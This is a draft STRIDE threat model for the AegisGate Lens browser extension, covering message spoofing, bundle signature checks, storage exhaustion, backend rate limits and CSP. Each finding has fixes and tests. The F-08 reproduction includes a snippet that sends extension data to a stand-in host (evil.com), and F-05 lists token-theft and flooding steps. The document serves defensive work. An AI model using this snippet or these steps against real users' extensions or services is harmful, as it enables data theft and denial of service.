# AegisGate Lens — Threat Model (STRIDE)

**Status**: Draft for Day 6-7 review.
**Version**: v0.1 (2026-06-22)
**Audience**: AegisGate Security internal; enterprise customers on request.
**Methodology**: STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege).

## Purpose

This document catalogs the threats the AegisGate Lens extension itself
faces. It is distinct from `LENS-MITRE-ATLAS-OWASP-MAPPING.md`, which
catalogs the threats the Lens **detects** in user prompts. Both are
needed; do not confuse them.

The goal is to enumerate realistic attack vectors, document the current
mitigation, and assign residual risk. Each finding has an action that
becomes a Day 8-10 deliverable in the 30-day plan.

## Scope

In-scope:

- The Lens extension source code in `src/`.
- The Lens bundle loading path (`util/bundle-loader.js`).
- The service worker (`src/service-worker.js`).
- `chrome.storage.local` and `chrome.storage.sync` usage.
- The wire protocol between content script, service worker, and backend.
- The chrome-extension:// origin and its `web_accessible_resources`.
- The Ed25519 bundle signing chain (`keys/lens-signing-private.pem`,
  `keys/lens-signing-public.pem`).

Out-of-scope (covered elsewhere):

- The detection logic itself (`src/detectors/`) — covered by
  `LENS-MITRE-ATLAS-OWASP-MAPPING.md`.
- The Lens backend (Go) — owned by the Platform monorepo; report to
  that repo's threat model.
- The browser's extension sandbox — owned by Chrome / Firefox.
- Third-party AI providers (ChatGPT, Claude, etc.) — they have their
  own threat models.

## Trust boundaries

```
+-----------------------------+         +-------------------------+
|  AI provider page (origin)  |  TSB-1  |  content script         |
|  e.g. https://chat.openai   |<------->|  (injected, isolated    |
|                             |         |   JS context)           |
+-----------------------------+         +-------------------------+
                                                  |
                                                  | chrome.runtime.
                                                  | sendMessage
                                                  v
                                       +-------------------------+
                                       |  service worker         |
                                       |  (chrome-extension://)  |
                                       +-------------------------+
                                                  |
                                                  | HTTPS (Bearer)
                                                  v
                                       +-------------------------+
                                       |  Lens backend           |
                                       |  lens.aegisgatesecurity |
                                       |  .io                    |
                                       +-------------------------+

  TSB-1: content script boundary. Page DOM is attacker-controlled.
  TSB-2: message-passing boundary. Sender.id not validated.
  TSB-3: network boundary. TLS 1.2+ only.
  TSB-4: backend trust boundary. Authenticated via bearer token.
```

## Findings

### F-01: Service worker accepts `chrome.runtime.onMessage` from any sender

**STRIDE category**: S (Spoofing), I (Information Disclosure), D (DoS),
E (Elevation of Privilege).

**Status (Day 8)**: RESOLVED — sender-id validation added and tested.

**Attack vector**: Any Chrome extension with `host_permissions` for our
extension pages OR any web page allowed by `externally_connectable` (we
don't set this — so only extensions with the matching IDs can connect;
but Chrome does allow same-ID connections from other components we
don't know about). A malicious extension can send:

- `{ type: 'lens.telemetry', event: <crafted> }` — fills the rate
  limit or sends attacker-controlled metadata.
- `{ type: 'lens.opt_in', payload: { enabled: true } }` — turns
  telemetry on without user consent.
- `{ type: 'lens.stats' }` — reads our local stats.

**Reproduction**:

```javascript
// From any page where the attacker can run JS (e.g. via XSS in a
// page the victim visits, or from a malicious extension):
chrome.runtime.sendMessage(
  'aegisgate-lens-extension-id',
  { type: 'lens.telemetry', event: { /* crafted */ } },
  () => {},
);
```

**Fix (Day 8)**: In `src/service-worker.js`, the `onMessage` listener
now validates `sender.id === chrome.runtime.id` (where OWN_ID is
derived from `chrome.runtime.id`) at the top of every dispatch:

```javascript
const OWN_ID = (typeof chrome !== 'undefined' && chrome.runtime &&
  chrome.runtime.id) || '';
if (!sender || sender.id !== OWN_ID) {
  log.warn('[AegisGate Lens] rejecting message from foreign sender:',
    sender && sender.id);
  sendResponse({ error: 'foreign sender rejected' });
  return false;
}
```

Case-sensitive comparison (no `toLowerCase()` bypass). Undefined and
empty-string sender IDs are rejected.

**Verification**: `test/security-sender-validation.test.mjs` runs
9 assertions:

1. OWN_ID is set on chrome.runtime.
2. Own-extension message reaches handler.
3. Foreign extension `lens.telemetry` is rejected.
4. Foreign extension `lens.opt_in` is rejected (the most dangerous
   attack vector — turning telemetry on without user consent).
5. Foreign extension `lens.stats` is rejected.
6. `sender.id === undefined` is rejected.
7. `sender.id === ''` is rejected.
8. Case-bypass (`aegisgate-lens-extension-id` vs
   `AEGISGATE-LENS-EXTENSION-ID`) is rejected.
9. Malformed message (no type) from foreign sender is rejected.

**Residual risk**: Very low. The fix is a one-line check on
`sender.id`. Chrome itself enforces `sender.id` is the actual
extension ID for cross-extension messages; we just compare it
correctly.

**Severity**: Originally CVSS 6.5 (Medium). Reclassified to
**RESOLVED** with evidence.

### F-02: Bundle signing verification

**STRIDE category**: T (Tampering).

**Status (Day 8)**: RESOLVED — verification IS wired and tested.

**Originally filed as**: "Ed25519 signing keys exist but bundle
verification not wired." On Day 8 inspection, the verification is in
fact wired in `src/util/bundle-loader.js`:

```javascript
// Splits the bundle bytes into pre-signature content + 64-byte Ed25519
// signature.
const bundleNoSig = bytes.slice(0, bytes.length - 64);
const signature   = bytes.slice(bytes.length - 64);
...
const publicKey = base64Decode(SIGNING_PUBLIC_KEY_B64);
const isValid   = await ed25519Verify(publicKey, bundleNoSig, signature);
if (!isValid) {
  throw new Error('Bundle signature verification FAILED - bundle may be tampered');
}
```

Plus a SHA-256 chain over the payload and each individual file in the
bundle. The public key is hardcoded as a base64 constant at the top of
the loader.

**Verification**: `test/security-bundle-verification.test.mjs` runs
9 assertions against the real `lens_ml_build/aegisgate-lens-v0.1.1.bundle`
fixture (8.7MB). All 9 pass:

1. Valid signed bundle parses successfully.
2. Flipping one byte in the payload fails signature verification.
3. Flipping one byte in the signature fails verification.
4. Removing the magic value fails (header not found).
5. Changing the magic value fails.
6. Truncating the bundle (last byte removed) fails.
7. Appending an extra byte fails signature verification.
8. Bundle header contains expected fields (bundle_version,
   total_payload_size, payload_sha256, files[] with per-file
   sha256/size/offset).
9. `reconstructModels` produces usable model list (41 files in v0.1.1).

**Residual risk**: Low in production (Chrome Web Store re-signs
bundles). Medium during dev if a malicious npm dependency replaces
the bundle files on disk — but `parseBundle` will throw at load time
because the Ed25519 signature will not match the modified bytes.

**Recommended action**: None for code. Add CI step that runs
`test/security-bundle-verification.test.mjs` on every PR.

**Severity**: Originally CVSS 7.5 (High) during dev / CVSS 5.0 (Medium)
in production. Reclassified to **RESOLVED** with evidence; residual
risk is now Low (Chrome Web Store double-signs) + Medium dev-pipeline
risk (mitigated by the same Ed25519 check at load time).

### F-03: Content script accepts input from attacker-controlled DOM

**STRIDE category**: T (Tampering), E (Elevation of Privilege).

**Attack vector**: A malicious page (or XSS in an AI provider page)
inserts text into the prompt field. The content script reads the
prompt field via `document.querySelector` and runs detection on it. A
sufficiently crafted prompt can:

- Trigger a high-TPR false positive to confuse the user.
- Trigger a low-TPR false negative to evade detection (the actual
  Lens attack surface).
- Cause the content script to log to the console (information leak
  via `console.warn`).

**Current mitigation**: Detectors are read-only. They do not mutate
the page or execute arbitrary JS. The schema allowlist prevents any
sensitive field from leaving the browser via telemetry.

**Residual risk**: Low. The Lens is **designed** to operate on
attacker-controlled input — that's the threat model of the user.

**Recommended action**: None. This is the intended threat surface.

**Severity**: N/A (intended).

### F-04: `chrome.storage.local` is unbounded for `dismissals`

**STRIDE category**: D (Denial of Service).

**Status (Day 9)**: RESOLVED — pruning + cap added and tested.

**Attack vector**: The `dismissals` key in `chrome.storage.local`
stores one entry per dismissed detection, with 24h expiry. A page
that triggers many distinct detections (e.g., pasting the entire
English dictionary into the prompt field) could fill
`chrome.storage.local` to the 10MB quota.

**Fix (Day 9)**: In `src/content.js`, `ContentScript.prototype.storeDismissal`
now performs two-step pruning before writing:

1. **Prune expired entries**: any entry with `expires_at < now` is
   removed (they'd just be dead weight — `isDismissed` already
   filters them on read, but they'd still consume quota).
2. **Cap enforcement**: if the count is still >=
   `ContentScript.DISMISSAL_MAX_ENTRIES` (1000), drop the oldest
   entries (by `dismissed_at`) until we're at `MAX - 1`, leaving
   room for the new entry.

The 1000-entry cap corresponds to ~120 KB at ~120 bytes per entry,
well under the 10 MB `chrome.storage.local` quota. This caps the
worst-case storage growth at 0.012 MB per 1000 dismissals.

**Verification**: `test/dismissals-pruning.test.mjs` runs 8 assertions:

1. `DISMISSAL_MAX_ENTRIES === 1000` (sanity).
2. 100 expired + 1 new → only 1 entry remains.
3. 50 expired + 50 live + 1 new → 51 entries (pruned correctly).
4. 1000 (MAX) valid + 1 new → exactly 1000 entries (oldest dropped).
5. 500 expired + 500 live + 1 new → 501 entries (pruning keeps live
   entries even when input was at cap).
6. New entry has correct shape (`dismissed_at`, `expires_at`,
   `reason`).
7. Domain hash prefix preserved in key (regression).
8. 100000 pre-existing entries bounded to ≤1000 after a single
   `storeDismissal` call (worst-case scenario from F-04 attack
   vector).

**Residual risk**: Very low. The cap is a hard ceiling regardless
of input.

**Severity**: Originally CVSS 3.5 (Low). Reclassified to
**RESOLVED** with evidence.

---

### F-05: Backend has no IP-based rate limit; only client-side

**STRIDE category**: D (Denial of Service), T (Tampering).

**Status (Day 9)**: HANDED OFF to Platform monorepo.

**Out of scope for this repo**: The Lens extension cannot fix the
backend. The fix must land in `pkg/lensbackend/` in the Platform
monorepo (Go code).

**Attack vector**: A botnet that obtains valid bearer tokens (by
installing the extension or via XSS in any page the victim visits)
can send unlimited telemetry events. Client-side rate limit is
100/min per installation; with 10,000 IPs and 10,000 tokens, the
botnet can send ~100,000,000 events/hour.

**Hand-off document**: `plans/LENS-BACKEND-RATE-LIMIT-ISSUE.md`
contains the full issue body ready to be filed in the Platform
monorepo. It includes:

- Threat context (link to F-05 in this threat model).
- Proposed three-layer rate limit (IP, token+IP, anomaly detection).
- Reference Go code for `pkg/lensbackend/telemetry.go`.
- Acceptance criteria.
- Out-of-scope notes.

**Recommended action**: File the issue in the Platform monorepo.
The fix is independent of any Lens extension release; it can ship
whenever the backend team has bandwidth.

**Severity**: Originally CVSS 5.5 (Medium). Reclassified to
**HANDED OFF** — implementation pending in Platform monorepo.

### F-05: Backend has no IP-based rate limit; only client-side

**STRIDE category**: D (Denial of Service), T (Tampering).

**Attack vector**: A bot that obtains a valid bearer token (by
installing the extension) can send 100 events/minute per IP — but if
it uses many IPs (botnet) or many install IDs (re-install loop), it
can flood the backend. The backend has no IP-based rate limit
documented in this threat model.

**Reproduction**:

1. Install the extension.
2. Extract the bearer token from `chrome.storage.local` (XSS in any
   page the victim visits).
3. Send 10,000 events from 100,000 rotating IPs.

**Current mitigation**: Client-side rate limit (100/min per
installation). Bearer tokens are per-installation, not per-IP.

**Residual risk**: Medium for backend availability. Low for user
privacy (the schema allowlist prevents prompt content from being sent
even if the bearer token leaks).

**Recommended action (Day 8-10, deferred to backend owner)**:

In the Lens backend (Go, owned by Platform monorepo):

1. IP-based rate limit: 1000 events/hour per IP across all bearer
   tokens.
2. Bearer-token-per-IP rate limit: 100/min (same as client-side, but
   re-enforced server-side).
3. Anomaly detection: alert if any installation sends 10x its
   historical median.

**Severity**: CVSS 5.5 (Medium). Backend service only.

### F-06: Manifest CSP is strict but doesn't cover content scripts

**STRIDE category**: T (Tampering), E (Elevation of Privilege).

**Attack vector**: The `content_security_policy.extension_pages` in
`manifest.json` is `script-src 'self'; object-src 'self'`. This applies
to the extension popup, welcome page, and service worker. It does
NOT apply to content scripts.

In MV3, content scripts cannot use `eval()` or `new Function()`
regardless of CSP, because they run in an isolated world with
`eval()` always disabled. Inline `<script>` tags injected via
`document.createElement('script')` ARE blocked by default. But the
content script CAN inject inline scripts into the page (where they
run in the page's CSP context, not ours).

**Current mitigation**: No `eval()` or `new Function()` anywhere in
`src/`. No `innerHTML` use anywhere. All DOM updates use
`textContent` (verified by `grep -rn innerHTML src/` returning zero
hits on Day 6).

**Residual risk**: Low. The MV3 isolated world is the strongest
mitigation.

**Recommended action (Day 10)**:

1. Verify the absence of `eval`, `new Function`, `innerHTML` in CI.
2. Add a test (`test/security-csp.test.mjs`) that asserts no dynamic
   code execution in `src/`.
3. Document the CSP policy in `docs/CSP-POLICY.md`.

**Severity**: CVSS 2.0 (Low). Defense-in-depth.

### F-07: `web_accessible_resources` exposes bundles to AI provider pages

**STRIDE category**: I (Information Disclosure).

**Attack vector**: The `aegisgate-lens-v0.1.0.bundle` and
`aegisgate-lens-transformer-v0.2.0.bundle` files are listed in
`web_accessible_resources` for the AI provider hosts. This means the
AI provider page can `<script src="chrome-extension://.../bundle">` to
load our bundle and inspect its contents.

The bundles are model files (TFLite / ONNX), not source code, so
they don't reveal detection secrets. But they DO reveal:

- The exact model architecture (ONNX graph can be reconstructed).
- The model weights (which can be downloaded by anyone and used to
  craft adversarial examples).

**Current mitigation**: The bundles are publicly available from the
Chrome Web Store anyway. The `web_accessible_resources` exposure is
not new.

**Residual risk**: Low. Adversarial example extraction is a known
risk for any ML detector and is the trade-off for a transparent,
auditable model.

**Recommended action**: None. Document the risk in
`docs/MODEL-CARD.md`.

**Severity**: N/A (accepted trade-off).

### F-08: No sender-id validation on `chrome.runtime.sendMessage` from content script

**STRIDE category**: S (Spoofing).

**Attack vector**: A malicious page can run `chrome.runtime.sendMessage`
targeting our extension ID if it knows our extension ID. The public
extension ID is discoverable from the Chrome Web Store URL.

**Reproduction**:

```javascript
// In a malicious page:
chrome.runtime.sendMessage(
  '<our-extension-id>',
  { type: 'lens.get_state' },
  (response) => { /* exfiltrate */ fetch('https://evil.com/?s=' + JSON.stringify(response)); },
);
```

**Current mitigation**: `lens.get_state` returns the opt-in state
(public information). `lens.stats` returns the local count of
detections (not sensitive). `lens.opt_in` would let an attacker toggle
telemetry — this IS a finding (covered by F-01).

**Residual risk**: Same as F-01.

**Recommended action**: Addressed by F-01's fix.

**Severity**: Same as F-01.

### F-09: Opt-in state changes are not signed

**STRIDE category**: R (Repudiation).

**Attack vector**: If `chrome.storage.sync` is somehow tampered with
(via a compromised sync account or a malicious extension with the
`storage` permission reading our sync storage — actually, that's
blocked by Chrome's per-extension storage isolation), the user could
later claim they didn't opt in.

**Current mitigation**: `storage.js` records `last_changed_at` and
`lens_version` alongside the opt-in flag, so we can see when and from
what version the change happened.

**Residual risk**: Very low. Chrome's storage isolation makes this
hard to exploit.

**Recommended action**: None for now. If the Lens backend starts
trusting opt-in state, add a server-side log of opt-in changes
including the version and timestamp.

**Severity**: CVSS 1.5 (Low).

## Summary table

| ID | Category | Original severity | Status (Day 9) | Action target |
|---|---|---|---|---|
| F-01 | S, I, D, E | Medium (6.5) | **RESOLVED** | Done (Day 8) |
| F-02 | T | Medium-High (5.0-7.5) | **RESOLVED** | Done (Day 8) |
| F-03 | T, E | N/A (intended) | — | — |
| F-04 | D | Low (3.5) | **RESOLVED** | Done (Day 9) |
| F-05 | D, T | Medium (5.5) | **HANDED OFF** | Platform monorepo (Day 9 handoff) |
| F-06 | T, E | Low (2.0) | OPEN | Day 10 |
| F-07 | I | N/A (accepted) | — | — |
| F-08 | S | Same as F-01 | **RESOLVED** (via F-01) | Done (Day 8) |
| F-09 | R | Low (1.5) | — | — |

## Action plan (Day 8-10)

**Day 8 (DONE)**:
- ✅ F-01 / F-08: Add `sender.id` validation to the service worker.
  Test: `test/security-sender-validation.test.mjs` (9 assertions).
- ✅ F-02: Confirm and test Ed25519 bundle verification IS wired.
  Test: `test/security-bundle-verification.test.mjs` (9 assertions
  on the real 8.7MB `lens_ml_build/aegisgate-lens-v0.1.1.bundle`).

**Day 9 (DONE)**:
- ✅ F-04: Pruning + 1000-entry cap added to
  `ContentScript.prototype.storeDismissal`. Test:
  `test/dismissals-pruning.test.mjs` (8 assertions).
- ✅ F-05: Handed off to Platform monorepo. Full issue body in
  `plans/LENS-BACKEND-RATE-LIMIT-ISSUE.md` ready to file.

**Day 10 (planned)**:
- F-06: Add `test/security-csp.test.mjs` that asserts no
  `eval`/`new Function`/`innerHTML` in `src/`. CI gate.

## References

- STRIDE: https://en.wikipedia.org/wiki/STRIDE_(security)
- MITRE ATLAS mapping: `plans/LENS-MITRE-ATLAS-OWASP-MAPPING.md`
- Model card: `plans/LENS-MODEL-CARD.md`
- Privacy policy: `docs/PRIVACY-POLICY.md`
- Bundle signing keys: `keys/lens-signing-{private,public}.pem`
